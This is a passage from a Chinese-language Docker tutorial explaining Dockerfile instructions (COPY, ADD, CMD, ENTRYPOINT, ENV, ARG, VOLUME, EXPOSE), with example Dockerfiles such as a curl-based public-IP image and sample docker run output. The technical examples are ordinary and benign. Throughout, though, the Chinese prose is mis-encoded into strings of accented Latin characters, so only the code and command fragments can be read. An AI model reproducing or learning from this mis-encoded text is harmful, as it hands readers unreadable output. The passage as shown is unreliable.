ç¼“å­˜æ–‡ä»¶ã€‚è¿™æ˜¯å¾ˆé‡è¦çš„ä¸€æ­¥ï¼Œæˆ‘ä»¬ä¹‹å‰è¯´è¿‡ï¼Œé•œåƒæ˜¯å¤šå±‚å­˜å‚¨ï¼Œæ¯ä¸€å±‚çš„ä¸œè¥¿å¹¶ä¸ä¼šåœ¨ä¸‹ä¸€å±‚è¢«åˆ é™¤ï¼Œä¼šä¸€ç›´è·Ÿéšç€é•œåƒã€‚å› æ­¤é•œåƒæ„å»ºæ—¶ï¼Œä¸€å®šè¦ç¡®ä¿æ¯ä¸€å±‚åªæ·»åŠ çœŸæ­£éœ€è¦æ·»åŠ çš„ä¸œè¥¿ï¼Œä»»ä½•æ— å…³çš„ä¸œè¥¿éƒ½åº”è¯¥æ¸…ç†æ‰ã€‚\n\n\n\n+ COPY å¤åˆ¶æ–‡ä»¶\n\næ ¼å¼ï¼š\n\n- `COPY <æºè·¯å¾„>... <ç›®æ ‡è·¯å¾„>`\n- `COPY [\"<æºè·¯å¾„1>\",... \"<ç›®æ ‡è·¯å¾„>\"]`\n\n\n\n`COPY` æŒ‡ä»¤å°†ä»æ„å»ºä¸Šä¸‹æ–‡ç›®å½•ä¸­ `<æºè·¯å¾„>` çš„æ–‡ä»¶/ç›®å½•å¤åˆ¶åˆ°æ–°çš„ä¸€å±‚çš„é•œåƒå†…çš„ `<ç›®æ ‡è·¯å¾„>` ä½ç½®ã€‚æ¯”å¦‚ï¼š\n\n```\nCOPY package.json /usr/src/app/\n```\n\n`<æºè·¯å¾„>` å¯ä»¥æ˜¯å¤šä¸ªï¼Œç”šè‡³å¯ä»¥æ˜¯é€šé…ç¬¦ï¼Œå…¶é€šé…ç¬¦è§„åˆ™è¦æ»¡è¶³ Go çš„ filepath.Match è§„åˆ™ï¼Œå¦‚ï¼š\n\n```\nCOPY hom* /mydir/\nCOPY hom?.txt /mydir/\n```\n\n\n\n`<ç›®æ ‡è·¯å¾„>` å¯ä»¥æ˜¯å®¹å™¨å†…çš„ç»å¯¹è·¯å¾„ï¼Œä¹Ÿå¯ä»¥æ˜¯ç›¸å¯¹äºå·¥ä½œç›®å½•çš„ç›¸å¯¹è·¯å¾„ï¼ˆå·¥ä½œç›®å½•å¯ä»¥ç”¨ `WORKDIR`æŒ‡ä»¤æ¥æŒ‡å®šï¼‰ã€‚ç›®æ ‡è·¯å¾„ä¸éœ€è¦äº‹å…ˆåˆ›å»ºï¼Œå¦‚æœç›®å½•ä¸å­˜åœ¨ä¼šåœ¨å¤åˆ¶æ–‡ä»¶å‰å…ˆè¡Œåˆ›å»ºç¼ºå¤±ç›®å½•ã€‚\n\næ­¤å¤–ï¼Œè¿˜éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œä½¿ç”¨ `COPY` æŒ‡ä»¤ï¼Œæºæ–‡ä»¶çš„å„ç§å…ƒæ•°æ®éƒ½ä¼šä¿ç•™ã€‚æ¯”å¦‚è¯»ã€å†™ã€æ‰§è¡Œæƒé™ã€æ–‡ä»¶å˜æ›´æ—¶é—´ç­‰ã€‚è¿™ä¸ªç‰¹æ€§å¯¹äºé•œåƒå®šåˆ¶å¾ˆæœ‰ç”¨ã€‚ç‰¹åˆ«æ˜¯æ„å»ºç›¸å…³æ–‡ä»¶éƒ½åœ¨ä½¿ç”¨ Git è¿›è¡Œç®¡ç†çš„æ—¶å€™ã€‚\n\n\n\n+ ADD æ›´é«˜çº§çš„å¤åˆ¶æ–‡ä»¶\n\n`ADD` æŒ‡ä»¤å’Œ `COPY` çš„æ ¼å¼å’Œæ€§è´¨åŸºæœ¬ä¸€è‡´ã€‚ä½†æ˜¯åœ¨ `COPY` åŸºç¡€ä¸Šå¢åŠ äº†ä¸€äº›åŠŸèƒ½ã€‚\n\n\n\n æ¯”å¦‚Â `<æºè·¯å¾„>`Â å¯ä»¥æ˜¯ä¸€ä¸ªÂ `URL`ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼ŒDocker å¼•æ“ä¼šè¯•å›¾å»ä¸‹è½½è¿™ä¸ªé“¾æ¥çš„æ–‡ä»¶æ”¾åˆ°Â `<ç›®æ ‡è·¯å¾„>`Â å»ã€‚ä¸‹è½½åçš„æ–‡ä»¶æƒé™è‡ªåŠ¨è®¾ç½®ä¸ºÂ `600`ï¼Œå¦‚æœè¿™å¹¶ä¸æ˜¯æƒ³è¦çš„æƒé™ï¼Œé‚£ä¹ˆè¿˜éœ€è¦å¢åŠ é¢å¤–çš„ä¸€å±‚Â `RUN`è¿›è¡Œæƒé™è°ƒæ•´ï¼Œå¦å¤–ï¼Œå¦‚æœä¸‹è½½çš„æ˜¯ä¸ªå‹ç¼©åŒ…ï¼Œéœ€è¦è§£å‹ç¼©ï¼Œä¹Ÿä¸€æ ·è¿˜éœ€è¦é¢å¤–çš„ä¸€å±‚Â `RUN`Â æŒ‡ä»¤è¿›è¡Œè§£å‹ç¼©ã€‚æ‰€ä»¥ä¸å¦‚ç›´æ¥ä½¿ç”¨Â `RUN`Â æŒ‡ä»¤ï¼Œç„¶åä½¿ç”¨Â `wget`Â æˆ–è€…Â `curl`Â å·¥å…·ä¸‹è½½ï¼Œå¤„ç†æƒé™ã€è§£å‹ç¼©ã€ç„¶åæ¸…ç†æ— ç”¨æ–‡ä»¶æ›´åˆç†ã€‚å› æ­¤ï¼Œè¿™ä¸ªåŠŸèƒ½å…¶å®å¹¶ä¸å®ç”¨ï¼Œè€Œä¸”ä¸æ¨èä½¿ç”¨ã€‚\n\n\n\n+ CMD å®¹å™¨å¯åŠ¨å‘½ä»¤ \n\n`CMD` æŒ‡ä»¤çš„æ ¼å¼å’Œ `RUN` ç›¸ä¼¼ï¼Œä¹Ÿæ˜¯ä¸¤ç§æ ¼å¼ï¼š\n\n- `shell` æ ¼å¼ï¼š`CMD <å‘½ä»¤>`\n\n- `exec` æ ¼å¼ï¼š`CMD [\"å¯æ‰§è¡Œæ–‡ä»¶\", \"å‚æ•°1\", \"å‚æ•°2\"...]`\n\n- å‚æ•°åˆ—è¡¨æ ¼å¼ï¼š`CMD [\"å‚æ•°1\", \"å‚æ•°2\"...]`ã€‚åœ¨æŒ‡å®šäº† `ENTRYPOINT` æŒ‡ä»¤åï¼Œç”¨ `CMD` æŒ‡å®šå…·ä½“çš„å‚æ•°ã€‚\n\n  \n\nä¹‹å‰ä»‹ç»å®¹å™¨çš„æ—¶å€™æ›¾ç»è¯´è¿‡ï¼ŒDocker ä¸æ˜¯è™šæ‹Ÿæœºï¼Œå®¹å™¨å°±æ˜¯è¿›ç¨‹ã€‚æ—¢ç„¶æ˜¯è¿›ç¨‹ï¼Œé‚£ä¹ˆåœ¨å¯åŠ¨å®¹å™¨çš„æ—¶å€™ï¼Œéœ€è¦æŒ‡å®šæ‰€è¿è¡Œçš„ç¨‹åºåŠå‚æ•°ã€‚`CMD` æŒ‡ä»¤å°±æ˜¯ç”¨äºæŒ‡å®šé»˜è®¤çš„å®¹å™¨ä¸»è¿›ç¨‹çš„å¯åŠ¨å‘½ä»¤çš„ã€‚\n\n \n\nåœ¨è¿è¡Œæ—¶å¯ä»¥æŒ‡å®šæ–°çš„å‘½ä»¤æ¥æ›¿ä»£é•œåƒè®¾ç½®ä¸­çš„è¿™ä¸ªé»˜è®¤å‘½ä»¤ï¼Œæ¯”å¦‚ï¼Œ`ubuntu`Â é•œåƒé»˜è®¤çš„Â `CMD`Â æ˜¯Â `/bin/bash`ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥Â `docker run -it ubuntu`Â çš„è¯ï¼Œä¼šç›´æ¥è¿›å…¥Â `bash`ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨è¿è¡Œæ—¶æŒ‡å®šè¿è¡Œåˆ«çš„å‘½ä»¤ï¼Œå¦‚Â `docker run -it ubuntu cat /etc/os-release`ã€‚è¿™å°±æ˜¯ç”¨Â `cat /etc/os-release`Â å‘½ä»¤æ›¿æ¢äº†é»˜è®¤çš„Â `/bin/bash`Â å‘½ä»¤äº†ï¼Œè¾“å‡ºäº†ç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯ã€‚\n\n\n\nåœ¨æŒ‡ä»¤æ ¼å¼ä¸Šï¼Œä¸€èˆ¬æ¨èä½¿ç”¨ `exec` æ ¼å¼ï¼Œè¿™ç±»æ ¼å¼åœ¨è§£ææ—¶ä¼šè¢«è§£æä¸º JSON æ•°ç»„ï¼Œå› æ­¤ä¸€å®šè¦ä½¿ç”¨åŒå¼•å· `\"`ï¼Œè€Œä¸è¦ä½¿ç”¨å•å¼•å·ã€‚\n\n\n\nå¦‚æœä½¿ç”¨ `shell` æ ¼å¼çš„è¯ï¼Œå®é™…çš„å‘½ä»¤ä¼šè¢«åŒ…è£…ä¸º `sh -c` çš„å‚æ•°çš„å½¢å¼è¿›è¡Œæ‰§è¡Œã€‚æ¯”å¦‚ï¼š\n\n```\nCMD echo $HOME\n```\n\nåœ¨å®é™…æ‰§è¡Œä¸­ï¼Œä¼šå°†å…¶å˜æ›´ä¸ºï¼š\n\n```\nCMD [ \"sh\", \"-c\", \"echo $HOME\" ]\n```\n\nè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç¯å¢ƒå˜é‡çš„åŸå› ï¼Œå› ä¸ºè¿™äº›ç¯å¢ƒå˜é‡ä¼šè¢« shell è¿›è¡Œè§£æå¤„ç†ã€‚\n\n\n\næåˆ° `CMD` å°±ä¸å¾—ä¸æå®¹å™¨ä¸­åº”ç”¨åœ¨å‰å°æ‰§è¡Œå’Œåå°æ‰§è¡Œçš„é—®é¢˜ã€‚è¿™æ˜¯åˆå­¦è€…å¸¸å‡ºç°çš„ä¸€ä¸ªæ··æ·†ã€‚\n\nDocker ä¸æ˜¯è™šæ‹Ÿæœºï¼Œå®¹å™¨ä¸­çš„åº”ç”¨éƒ½åº”è¯¥ä»¥å‰å°æ‰§è¡Œï¼Œè€Œä¸æ˜¯åƒè™šæ‹Ÿæœºã€ç‰©ç†æœºé‡Œé¢é‚£æ ·ï¼Œç”¨ upstart/systemd å»å¯åŠ¨åå°æœåŠ¡ï¼Œå®¹å™¨å†…æ²¡æœ‰åå°æœåŠ¡çš„æ¦‚å¿µã€‚\n\nä¸€äº›åˆå­¦è€…å°† `CMD` å†™ä¸ºï¼š\n\n```\nCMD service nginx start\n```\n\nç„¶åå‘ç°å®¹å™¨æ‰§è¡Œåå°±ç«‹å³é€€å‡ºäº†ã€‚ç”šè‡³åœ¨å®¹å™¨å†…å»ä½¿ç”¨ `systemctl` å‘½ä»¤ç»“æœå´å‘ç°æ ¹æœ¬æ‰§è¡Œä¸äº†ã€‚è¿™å°±æ˜¯å› ä¸ºæ²¡æœ‰ææ˜ç™½å‰å°ã€åå°çš„æ¦‚å¿µï¼Œæ²¡æœ‰åŒºåˆ†å®¹å™¨å’Œè™šæ‹Ÿæœºçš„å·®å¼‚ï¼Œä¾æ—§åœ¨ä»¥ä¼ ç»Ÿè™šæ‹Ÿæœºçš„è§’åº¦å»ç†è§£å®¹å™¨ã€‚   \n\nå¯¹äºå®¹å™¨è€Œè¨€ï¼Œå…¶å¯åŠ¨ç¨‹åºå°±æ˜¯å®¹å™¨åº”ç”¨è¿›ç¨‹ï¼Œå®¹å™¨å°±æ˜¯ä¸ºäº†ä¸»è¿›ç¨‹è€Œå­˜åœ¨çš„ï¼Œä¸»è¿›ç¨‹é€€å‡ºï¼Œå®¹å™¨å°±å¤±å»äº†å­˜åœ¨çš„æ„ä¹‰ï¼Œä»è€Œé€€å‡ºï¼Œå…¶å®ƒè¾…åŠ©è¿›ç¨‹ä¸æ˜¯å®ƒéœ€è¦å…³å¿ƒçš„ä¸œè¥¿ã€‚\n\n \n\nè€Œä½¿ç”¨ `service nginx start` å‘½ä»¤ï¼Œåˆ™æ˜¯å¸Œæœ› upstart æ¥ä»¥åå°å®ˆæŠ¤è¿›ç¨‹å½¢å¼å¯åŠ¨ `nginx` æœåŠ¡ã€‚è€Œåˆšæ‰è¯´äº† `CMD service nginx start` ä¼šè¢«ç†è§£ä¸º `CMD [ \"sh\", \"-c\", \"service nginx start\"]`ï¼Œå› æ­¤ä¸»è¿›ç¨‹å®é™…ä¸Šæ˜¯ `sh`ã€‚é‚£ä¹ˆå½“ `service nginx start` å‘½ä»¤ç»“æŸåï¼Œ`sh` ä¹Ÿå°±ç»“æŸäº†ï¼Œ`sh` ä½œä¸ºä¸»è¿›ç¨‹é€€å‡ºäº†ï¼Œè‡ªç„¶å°±ä¼šä»¤å®¹å™¨é€€å‡ºã€‚\n\næ­£ç¡®çš„åšæ³•æ˜¯ç›´æ¥æ‰§è¡Œ `nginx` å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶ä¸”è¦æ±‚ä»¥å‰å°å½¢å¼è¿è¡Œã€‚æ¯”å¦‚ï¼š\n\n```\nCMD [\"nginx\", \"-g\", \"daemon off;\"]\n```\n\n\n\n+ ENTRYPOINT å…¥å£ç‚¹\n\n`ENTRYPOINT` çš„ç›®çš„å’Œ `CMD` ä¸€æ ·ï¼Œéƒ½æ˜¯åœ¨æŒ‡å®šå®¹å™¨å¯åŠ¨ç¨‹åºåŠå‚æ•°ã€‚`ENTRYPOINT` åœ¨è¿è¡Œæ—¶ä¹Ÿå¯ä»¥æ›¿ä»£ï¼Œä¸è¿‡æ¯” `CMD` è¦ç•¥æ˜¾ç¹çï¼Œéœ€è¦é€šè¿‡ `docker run` çš„å‚æ•° `--entrypoint` æ¥æŒ‡å®šã€‚\n\n \n\nå½“æŒ‡å®šäº† `ENTRYPOINT` åï¼Œ`CMD` çš„å«ä¹‰å°±å‘ç”Ÿäº†æ”¹å˜ï¼Œä¸å†æ˜¯ç›´æ¥çš„è¿è¡Œå…¶å‘½ä»¤ï¼Œè€Œæ˜¯å°† `CMD` çš„å†…å®¹ä½œä¸ºå‚æ•°ä¼ ç»™ `ENTRYPOINT` æŒ‡ä»¤ï¼Œæ¢å¥è¯è¯´å®é™…æ‰§è¡Œæ—¶ï¼Œå°†å˜ä¸ºï¼š\n\n```\n<ENTRYPOINT> \"<CMD>\"\n```\n\né‚£ä¹ˆæœ‰äº†Â `CMD`Â åï¼Œä¸ºä»€ä¹ˆè¿˜è¦æœ‰Â `ENTRYPOINT`Â å‘¢ï¼Ÿè¿™ç§Â `<ENTRYPOINT> \"<CMD>\"`Â æœ‰ä»€ä¹ˆå¥½å¤„ä¹ˆï¼Ÿè®©æˆ‘ä»¬æ¥çœ‹å‡ ä¸ªåœºæ™¯ã€‚\n\n\n\n+ åœºæ™¯ä¸€ï¼šè®©é•œåƒå˜æˆåƒå‘½ä»¤ä¸€æ ·ä½¿ç”¨\n\nå‡è®¾æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå¾—çŸ¥è‡ªå·±å½“å‰å…¬ç½‘ IP çš„é•œåƒï¼Œé‚£ä¹ˆå¯ä»¥å…ˆç”¨ `CMD` æ¥å®ç°ï¼š\n\n```\nFROM ubuntu:16.04\nRUN apt-get update \\\n    && apt-get install -y curl \\\n    && rm -rf /var/lib/apt/lists/*\nCMD [ \"curl\", \"-s\", \"http://ip.cn\" ]\n```\n\nå‡å¦‚æˆ‘ä»¬ä½¿ç”¨ `docker build -t myip .` æ¥æ„å»ºé•œåƒçš„è¯ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦æŸ¥è¯¢å½“å‰å…¬ç½‘ IPï¼Œåªéœ€è¦æ‰§è¡Œï¼š\n\n```\n$ docker run myip\nå½“å‰ IPï¼š61.148.226.66 æ¥è‡ªï¼šåŒ—äº¬å¸‚ è”é€š\n```\n\nå—¯ï¼Œè¿™ä¹ˆçœ‹èµ·æ¥å¥½åƒå¯ä»¥ç›´æ¥æŠŠé•œåƒå½“åšå‘½ä»¤ä½¿ç”¨äº†ï¼Œä¸è¿‡å‘½ä»¤æ€»æœ‰å‚æ•°ï¼Œå¦‚æœæˆ‘ä»¬å¸Œæœ›åŠ å‚æ•°å‘¢ï¼Ÿæ¯”å¦‚ä»ä¸Šé¢çš„ `CMD` ä¸­å¯ä»¥çœ‹åˆ°å®è´¨çš„å‘½ä»¤æ˜¯ `curl`ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬å¸Œæœ›æ˜¾ç¤º HTTP å¤´ä¿¡æ¯ï¼Œå°±éœ€è¦åŠ ä¸Š `-i` å‚æ•°ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥åŠ  `-i` å‚æ•°ç»™ `docker run myip` ä¹ˆï¼Ÿ\n\n```\n$ docker run myip -i\ndocker: Error response from daemon: invalid header field value \"oci runtime error: container_linux.go:247: starting container process caused \\\"exec: \\\\\\\"-i\\\\\\\": executable file not found in $PATH\\\"\\n\".\n```\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯æ‰§è¡Œæ–‡ä»¶æ‰¾ä¸åˆ°çš„æŠ¥é”™ï¼Œ`executable file not found`ã€‚ä¹‹å‰æˆ‘ä»¬è¯´è¿‡ï¼Œè·Ÿåœ¨é•œåƒååé¢çš„æ˜¯ `command`ï¼Œè¿è¡Œæ—¶ä¼šæ›¿æ¢ `CMD` çš„é»˜è®¤å€¼ã€‚å› æ­¤è¿™é‡Œçš„ `-i` æ›¿æ¢äº†åŸæ¥çš„ `CMD`ï¼Œè€Œä¸æ˜¯æ·»åŠ åœ¨åŸæ¥çš„ `curl -s http://ip.cn` åé¢ã€‚è€Œ `-i` æ ¹æœ¬ä¸æ˜¯å‘½ä»¤ï¼Œæ‰€ä»¥è‡ªç„¶æ‰¾ä¸åˆ°ã€‚\n\n\n\nç°åœ¨æˆ‘ä»¬é‡æ–°ç”¨ `ENTRYPOINT` æ¥å®ç°è¿™ä¸ªé•œåƒï¼š\n\n```\nFROM ubuntu:16.04\nRUN apt-get update \\\n    && apt-get install -y curl \\\n    && rm -rf /var/lib/apt/lists/*\nENTRYPOINT [ \"curl\", \"-s\", \"http://ip.cn\" ]\n```\n\nè¿™æ¬¡æˆ‘ä»¬å†æ¥å°è¯•ç›´æ¥ä½¿ç”¨ `docker run myip -i`ï¼š\n\n```\n$ docker run myip\nå½“å‰ IPï¼š61.148.226.66 æ¥è‡ªï¼šåŒ—äº¬å¸‚ è”é€š\n\n$ docker run myip -i\nHTTP/1.1 200 OK\nServer: nginx/1.8.0\nDate: Tue, 22 Nov 2016 05:12:40 GMT\nContent-Type: text/html; charset=UTF-8\nVary: Accept-Encoding\nX-Powered-By: PHP/5.6.24-1~dotdeb+7.1\nX-Cache: MISS from cache-2\nX-Cache-Lookup: MISS from cache-2:80\nX-Cache: MISS from proxy-2_6\nTransfer-Encoding: chunked\nVia: 1.1 cache-2:80, 1.1 proxy-2_6:8006\nConnection: keep-alive\n\nå½“å‰ IPï¼š61.148.226.66 æ¥è‡ªï¼šåŒ—äº¬å¸‚ è”é€š\n```\n\nå¯ä»¥çœ‹åˆ°ï¼Œè¿™æ¬¡æˆåŠŸäº†ã€‚è¿™æ˜¯å› ä¸ºå½“å­˜åœ¨Â `ENTRYPOINT`Â åï¼Œ`CMD`Â çš„å†…å®¹å°†ä¼šä½œä¸ºå‚æ•°ä¼ ç»™Â `ENTRYPOINT`ï¼Œè€Œè¿™é‡ŒÂ `-i`Â å°±æ˜¯æ–°çš„Â `CMD`ï¼Œå› æ­¤ä¼šä½œä¸ºå‚æ•°ä¼ ç»™Â `curl`ï¼Œä»è€Œè¾¾åˆ°äº†æˆ‘ä»¬é¢„æœŸçš„æ•ˆæœã€‚ \n\n  \n\n+ åœºæ™¯äºŒï¼šåº”ç”¨è¿è¡Œå‰çš„å‡†å¤‡å·¥ä½œ\n\n å¯åŠ¨å®¹å™¨å°±æ˜¯å¯åŠ¨ä¸»è¿›ç¨‹ï¼Œä½†æœ‰äº›æ—¶å€™ï¼Œå¯åŠ¨ä¸»è¿›ç¨‹å‰ï¼Œéœ€è¦ä¸€äº›å‡†å¤‡å·¥ä½œã€‚\n\næ¯”å¦‚ `mysql` ç±»çš„æ•°æ®åº“ï¼Œå¯èƒ½éœ€è¦ä¸€äº›æ•°æ®åº“é…ç½®ã€åˆå§‹åŒ–çš„å·¥ä½œï¼Œè¿™äº›å·¥ä½œè¦åœ¨æœ€ç»ˆçš„ mysql æœåŠ¡å™¨è¿è¡Œä¹‹å‰è§£å†³ã€‚\n\næ­¤å¤–ï¼Œå¯èƒ½å¸Œæœ›é¿å…ä½¿ç”¨ `root` ç”¨æˆ·å»å¯åŠ¨æœåŠ¡ï¼Œä»è€Œæé«˜å®‰å…¨æ€§ï¼Œè€Œåœ¨å¯åŠ¨æœåŠ¡å‰è¿˜éœ€è¦ä»¥ `root` èº«ä»½æ‰§è¡Œä¸€äº›å¿…è¦çš„å‡†å¤‡å·¥ä½œï¼Œæœ€ååˆ‡æ¢åˆ°æœåŠ¡ç”¨æˆ·èº«ä»½å¯åŠ¨æœåŠ¡ã€‚æˆ–è€…é™¤äº†æœåŠ¡å¤–ï¼Œå…¶å®ƒå‘½ä»¤ä¾æ—§å¯ä»¥ä½¿ç”¨ `root` èº«ä»½æ‰§è¡Œï¼Œæ–¹ä¾¿è°ƒè¯•ç­‰ã€‚\n\nè¿™äº›å‡†å¤‡å·¥ä½œæ˜¯å’Œå®¹å™¨Â `CMD`Â æ— å…³çš„ï¼Œæ— è®ºÂ `CMD`Â ä¸ºä»€ä¹ˆï¼Œéƒ½éœ€è¦äº‹å…ˆè¿›è¡Œä¸€ä¸ªé¢„å¤„ç†çš„å·¥ä½œã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥å†™ä¸€ä¸ªè„šæœ¬ï¼Œç„¶åæ”¾å…¥Â `ENTRYPOINT`Â ä¸­å»æ‰§è¡Œï¼Œè€Œè¿™ä¸ªè„šæœ¬ä¼šå°†æ¥åˆ°çš„å‚æ•°ï¼ˆä¹Ÿå°±æ˜¯Â `<CMD>`ï¼‰ä½œä¸ºå‘½ä»¤ï¼Œåœ¨è„šæœ¬æœ€åæ‰§è¡Œã€‚æ¯”å¦‚å®˜æ–¹é•œåƒÂ `redis`Â ä¸­å°±æ˜¯è¿™ä¹ˆåšçš„ï¼š\n\n```\nFROM alpine:3.4\n...\nRUN addgroup -S redis && adduser -S -G redis redis\n...\nENTRYPOINT [\"docker-entrypoint.sh\"]\n\nEXPOSE 6379\nCMD [ \"redis-server\" ] \n```\n\n\n\n+ ENV è®¾ç½®ç¯å¢ƒå˜é‡\n\næ ¼å¼æœ‰ä¸¤ç§ï¼š\n\n- `ENV <key> <value>`\n\n- `ENV <key1>=<value1> <key2>=<value2>...`\n\n  \n\nè¿™ä¸ªæŒ‡ä»¤å¾ˆç®€å•ï¼Œå°±æ˜¯è®¾ç½®ç¯å¢ƒå˜é‡è€Œå·²ï¼Œæ— è®ºæ˜¯åé¢çš„å…¶å®ƒæŒ‡ä»¤ï¼Œå¦‚Â `RUN`ï¼Œè¿˜æ˜¯è¿è¡Œæ—¶çš„åº”ç”¨ï¼Œéƒ½å¯ä»¥ç›´æ¥ä½¿ç”¨è¿™é‡Œå®šä¹‰çš„ç¯å¢ƒå˜é‡ã€‚\n\n```\nENV NODE_VERSION 7.2.0\n\nRUN curl -SLO \"https://nodejs.org/dist/v$NODE_VERSION/node-v$NODE_VERSION-linux-x64.tar.xz\" \\\n  && curl -SLO \"https://nodejs.org/dist/v$NODE_VERSION/SHASUMS256.txt.asc\" \\\n\n```\n\n\n\nä¸‹åˆ—æŒ‡ä»¤å¯ä»¥æ”¯æŒç¯å¢ƒå˜é‡å±•å¼€ï¼šÂ `ADD`ã€`COPY`ã€`ENV`ã€`EXPOSE`ã€`LABEL`ã€`USER`ã€`WORKDIR`ã€`VOLUME`ã€`STOPSIGNAL`ã€`ONBUILD`ã€‚\n\n\n\n+ ARG æ„å»ºå‚æ•°(æ„å»ºç¯å¢ƒçš„ç¯å¢ƒå˜é‡)\n\næ ¼å¼ï¼š`ARG <å‚æ•°å>[=<é»˜è®¤å€¼>]`\n\næ„å»ºå‚æ•°å’Œ `ENV` çš„æ•ˆæœä¸€æ ·ï¼Œéƒ½æ˜¯è®¾ç½®ç¯å¢ƒå˜é‡ã€‚æ‰€ä¸åŒçš„æ˜¯ï¼Œ`ARG` æ‰€è®¾ç½®çš„æ„å»ºç¯å¢ƒçš„ç¯å¢ƒå˜é‡ï¼Œåœ¨å°†æ¥å®¹å™¨è¿è¡Œæ—¶æ˜¯ä¸ä¼šå­˜åœ¨è¿™äº›ç¯å¢ƒå˜é‡çš„ã€‚ä½†æ˜¯ä¸è¦å› æ­¤å°±ä½¿ç”¨ `ARG` ä¿å­˜å¯†ç ä¹‹ç±»çš„ä¿¡æ¯ï¼Œå› ä¸º `docker history` è¿˜æ˜¯å¯ä»¥çœ‹åˆ°æ‰€æœ‰å€¼çš„ã€‚\n\n`Dockerfile`Â ä¸­çš„Â `ARG`Â æŒ‡ä»¤æ˜¯å®šä¹‰å‚æ•°åç§°ï¼Œä»¥åŠå®šä¹‰å…¶é»˜è®¤å€¼ã€‚è¯¥é»˜è®¤å€¼å¯ä»¥åœ¨æ„å»ºå‘½ä»¤Â `docker build`Â ä¸­ç”¨Â `--build-arg <å‚æ•°å>=<å€¼>`Â æ¥è¦†ç›–ã€‚\n\n\n\n+ VOLUME å®šä¹‰åŒ¿åå·\n\næ ¼å¼ä¸ºï¼š\n\n- `VOLUME [\"<è·¯å¾„1>\", \"<è·¯å¾„2>\"...]`\n- `VOLUME <è·¯å¾„>`\n\nä¸ºäº†é˜²æ­¢è¿è¡Œæ—¶ç”¨æˆ·å¿˜è®°å°†åŠ¨æ€æ–‡ä»¶æ‰€ä¿å­˜ç›®å½•æŒ‚è½½ä¸ºå·ï¼Œåœ¨ `Dockerfile` ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥äº‹å…ˆæŒ‡å®šæŸäº›ç›®å½•æŒ‚è½½ä¸ºåŒ¿åå·ï¼Œè¿™æ ·åœ¨è¿è¡Œæ—¶å¦‚æœç”¨æˆ·ä¸æŒ‡å®šæŒ‚è½½ï¼Œå…¶åº”ç”¨ä¹Ÿå¯ä»¥æ­£å¸¸è¿è¡Œï¼Œä¸ä¼šå‘å®¹å™¨å­˜å‚¨å±‚å†™å…¥å¤§é‡æ•°æ®ã€‚\n\n```\nVOLUME /data\n```\n\n\n\nè¿™é‡Œçš„ `/data` ç›®å½•å°±ä¼šåœ¨è¿è¡Œæ—¶è‡ªåŠ¨æŒ‚è½½ä¸ºåŒ¿åå·ï¼Œä»»ä½•å‘ `/data` ä¸­å†™å…¥çš„ä¿¡æ¯éƒ½ä¸ä¼šè®°å½•è¿›å®¹å™¨å­˜å‚¨å±‚ï¼Œä»è€Œä¿è¯äº†å®¹å™¨å­˜å‚¨å±‚çš„æ— çŠ¶æ€åŒ–ã€‚å½“ç„¶ï¼Œè¿è¡Œæ—¶å¯ä»¥è¦†ç›–è¿™ä¸ªæŒ‚è½½è®¾ç½®ã€‚æ¯”å¦‚ï¼š\n\n```\ndocker run -d -v mydata:/data xxxx\n```\n\n åœ¨è¿™è¡Œå‘½ä»¤ä¸­ï¼Œå°±ä½¿ç”¨äº†Â `mydata`Â è¿™ä¸ªå‘½åå·æŒ‚è½½åˆ°äº†Â `/data`Â è¿™ä¸ªä½ç½®ï¼Œæ›¿ä»£äº†Â `Dockerfile`Â ä¸­å®šä¹‰çš„åŒ¿åå·çš„æŒ‚è½½é…ç½®ã€‚ \n\n\n\n+ EXPOSE å£°æ˜ç«¯å£\n\næ ¼å¼ä¸ºÂ `EXPOSE <ç«¯å£1> [<ç«¯å£2>...]`ã€‚\n\n`EXPOSE`Â æŒ‡ä»¤æ˜¯å£°æ˜è¿è¡Œæ—¶å®¹å™¨æä¾›æœåŠ¡ç«¯å£ï¼Œè¿™åªæ˜¯ä¸€ä¸ªå£°æ˜ï¼Œåœ¨è¿è¡Œæ—¶å¹¶ä¸ä¼šå› ä¸ºè¿™ä¸ªå£°æ˜åº”ç”¨å°±ä¼šå¼€å¯è¿™ä¸ªç«¯å£çš„æœåŠ¡ã€‚åœ¨ Dockerfile ä¸­å†™å…¥è¿™æ ·çš„å£°æ˜æœ‰ä¸¤ä¸ªå¥½å¤„ï¼Œä¸€ä¸ªæ˜¯å¸®åŠ©é•œåƒä½¿ç”¨è€…ç†è§£è¿™ä¸ªé•œåƒæœåŠ¡çš„å®ˆæŠ¤ç«¯å£ï¼Œä»¥æ–¹ä¾¿é…ç½®æ˜ å°„ï¼›å¦ä¸€ä¸ªç”¨å¤„åˆ™æ˜¯åœ¨è¿è¡Œæ—¶ä½¿ç”¨éšæœºç«¯å£æ˜ å°„æ—¶ï¼Œä¹Ÿå°±æ˜¯Â `docker run -P`æ—¶ï¼Œä¼šè‡ªåŠ¨éšæœºæ˜ å°„Â `EXPOSE`Â çš„ç«¯å£ã€‚\n\n\n\nè¦å°†Â `EXPOSE`Â å’Œåœ¨è¿è¡Œæ—¶ä½¿ç”¨Â `-p <å®¿ä¸»ç«¯å£>:<å®¹å™¨ç«¯å£>`Â åŒºåˆ†å¼€æ¥ã€‚`-p`ï¼Œæ˜¯æ˜ å°„å®¿ä¸»ç«¯å£å’Œå®¹å™¨ç«¯å£ï¼Œæ¢å¥è¯è¯´ï¼Œå°±æ˜¯å°†å®¹å™¨çš„å¯¹åº”ç«¯å£æœåŠ¡å…¬å¼€ç»™å¤–ç•Œè®¿é—®ï¼Œè€ŒÂ `EXPOSE`Â 